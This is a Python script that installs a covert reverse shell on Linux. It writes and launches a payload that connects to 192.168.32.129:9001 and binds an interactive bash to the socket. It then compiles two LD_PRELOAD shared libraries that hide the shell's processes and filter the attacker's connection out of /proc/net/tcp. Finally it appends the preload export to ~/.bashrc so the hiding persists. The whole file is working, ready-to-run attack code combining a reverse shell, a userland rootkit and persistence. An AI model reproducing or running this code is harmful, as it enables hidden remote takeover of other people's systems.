import os
import subprocess
import time

def create_tmp_directory(directory_name):
    tmp_directory = os.path.join('/tmp', directory_name)
    if not os.path.exists(tmp_directory):
        os.makedirs(tmp_directory)
    return tmp_directory

# Set the directory where all files will be saved
not_suspicious_dir = create_tmp_directory("notverysusciousfilecontainingnogayporn")

# File paths
a_py_path = os.path.join(not_suspicious_dir, "a.py")
pid1_c_path = os.path.join(not_suspicious_dir, "pid1.c")
tcp_hider_c_path = os.path.join(not_suspicious_dir, "tcp_hider.c")
library_pid1_path = os.path.join(not_suspicious_dir, "library_pid1.so")
library_tcp_hider_path = os.path.join(not_suspicious_dir, "library_tcp_hider.so")
tcp_file_path = os.path.join(not_suspicious_dir, "tcp")

# Step 1: Create a.py and save the provided code in it
a_py_code = """#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket 
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.32.129", 9001))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
run(["/bin/bash","-i"])
"""

with open(a_py_path, "w") as a_py_file:
    a_py_file.write(a_py_code)

# Step 2: Run a.py in the background from the tmp directory
subprocess.Popen(["python3", a_py_path, "&"], cwd=not_suspicious_dir)

# Wait for a moment to allow the "python a.py" process to start
time.sleep(5)

# Step 3: Run `ps aux` to find the PIDs of the processes with names "/bin/bash -i" and "python a.py"
ps_aux_output = subprocess.check_output(["ps", "aux"]).decode("utf-8")
pid1 = None
pid2 = None

for line in ps_aux_output.splitlines():
    if "bash" in line:
        parts = line.split()
        pid1 = int(parts[1])
    elif "python3 /tmp/notverysusciousfilecontainingnogayporn/a.py" in line:
        parts = line.split()
        pid2 = int(parts[1])

# Step 4: Create the C code to hide the specified PIDs
c_code = f"""#define _GNU_SOURCE

#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

// Define an array to store the PIDs to hide
static const int pids_to_hide[] = {{ {pid1}, {pid2} }}; // Replace with your desired PIDs

static struct dirent* (*readdir_original)(DIR *dirp) = NULL;

struct dirent* readdir(DIR *dirp) {{
    struct dirent *original_response;

    if (readdir_original == NULL) {{
        readdir_original = dlsym(RTLD_NEXT, "readdir");
        if (readdir_original == NULL) {{
            // Handle the error
        }}
    }}

    while (1) {{
        original_response = (*readdir_original)(dirp);
        if (original_response != NULL) {{

            // Check if the directory entry represents a process folder (numeric name)
            if (original_response->d_name[0] >= '0' && original_response->d_name[0] <= '9') {{
                int process_pid = atoi(original_response->d_name);

                // Check if the process PID is in the array of PIDs to hide
                int i;
                int hide = 0; // Assume we don't want to hide the process

                for (i = 0; i < sizeof(pids_to_hide) / sizeof(pids_to_hide[0]); i++) {{
                    if (process_pid == pids_to_hide[i]) {{
                        hide = 1; // We want to hide the process
                        break;
                    }}
                }}

                if (hide) {{
                    continue;
                }}
            }}
        }}
        break;
    }}
    return original_response;
}}
"""

# Step 5: Save the C code to pid1.c
with open(pid1_c_path, "w") as c_file:
    c_file.write(c_code)

# Step 6: Compile the C code into a shared library
subprocess.call(["gcc", "-fPIC", "-shared", "-o", library_pid1_path, pid1_c_path, "-ldl", "-Wall","-w"])

# Define the second C code to hide `/proc/net/tcp`
c_code_2 = """
#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

static FILE *(*original_fopen64)(const char *pathname, const char *mode) = NULL;

FILE *fopen64(const char *pathname, const char *mode) {
    // Load the original fopen64 function if not loaded
    if (!original_fopen64) {
        original_fopen64 = dlsym(RTLD_NEXT, "fopen64");
        if (!original_fopen64) {
            exit(EXIT_FAILURE);
        }
    }

    // Check if the file being opened is /proc/net/tcp and modify the path to current directory
    if (strcmp(pathname, "/proc/net/tcp") == 0) {
        char cwd[1024];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
            static char newPath[1024];
            snprintf(newPath, sizeof(newPath), "%s/tcp", cwd);
            pathname = newPath;
        } else {
            perror("getcwd() error");
            return NULL;
        }
    }

    // Call the original fopen64 function
    return original_fopen64(pathname, mode);
}

"""

# Save the second C code to tcp_hider.c
with open(tcp_hider_c_path, "w") as c_file_2:
    c_file_2.write(c_code_2)

# Compile the second C code into a shared library
subprocess.call(["gcc", "-fPIC", "-shared", "-o", library_tcp_hider_path, tcp_hider_c_path, "-ldl", "-Wall","-w"])

def read_and_write_tcp_info():
    source_file = "/proc/net/tcp"
    destination_file = "tcp"
    exclude_pattern = "8120A8C0:2329"  # The pattern to exclude

    try:
        with open(source_file, 'r') as src:
            lines = src.readlines()

        with open(destination_file, 'w') as dst:
            for line in lines:
                # Write the line only if the exclude pattern is not in it
                if exclude_pattern not in line:
                    dst.write(line)
    
    except Exception as e:
        print("An error occurred:", e)


def append_to_bashrc(line_to_append):
    bashrc_path = os.path.expanduser('~/.bashrc')
    try:
        with open(bashrc_path, 'a') as bashrc_file:
            bashrc_file.write("\n" + line_to_append + "\n")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    read_and_write_tcp_info()
    
    # Create the LD_PRELOAD export command with full paths
    preload_command = f"export LD_PRELOAD={library_pid1_path}:{library_tcp_hider_path}"
    
    # Append the command to ~/.bashrc
    append_to_bashrc(preload_command)